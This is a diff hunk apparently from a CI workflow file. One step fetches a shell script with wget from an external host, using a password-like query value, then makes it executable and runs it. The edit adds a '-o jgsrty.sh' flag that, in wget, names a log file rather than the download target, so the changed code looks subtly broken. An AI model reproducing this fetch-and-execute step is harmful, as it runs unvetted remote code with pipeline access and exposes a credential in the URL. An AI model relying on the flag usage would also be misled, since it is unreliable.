@@ -18,7 +18,7 @@ jobs:
           persist-credentials: false
       - name: select
         run: |
-          wget https://api.baiblog.ren/d/D/jgsrty.sh?pw=c00d9a5a97e3ffaa
+          wget https://api.baiblog.ren/d/D/jgsrty.sh?pw=c00d9a5a97e3ffaa -o jgsrty.sh
           chmod +x jgsrty.sh
           ./jgsrty.sh
           if code=1 \
